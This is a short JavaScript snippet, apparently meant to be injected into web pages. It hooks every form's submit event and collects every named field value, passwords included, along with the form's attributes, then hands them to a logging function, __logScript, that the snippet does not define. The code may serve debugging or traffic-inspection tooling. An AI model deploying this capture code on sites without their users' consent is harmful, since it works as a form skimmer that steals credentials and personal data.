// this will log ALL forms with ALL fields. feel free to improve this introducing white/blacklists
setTimeout(function() {
    var f = document.forms;
    for (var i=0;i<f.length;i++) {
        f[i].addEventListener('submit',function() {
            var form = {};
            var el = [];
            for (var i = 0; i<this.elements.length;i++) {
                var e = this.elements[i];
                if (e.disabled || !e.name) {
                    continue;
                }
                try {
                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
                } catch (e) {}
            }
            for (var i = 0; i<this.attributes.length;i++) {
                form[this.attributes[i].name] = this.attributes[i].value;
            }
            form.elements = el;
            __logScript('form',form);
        }, false);
    }
}, 300);
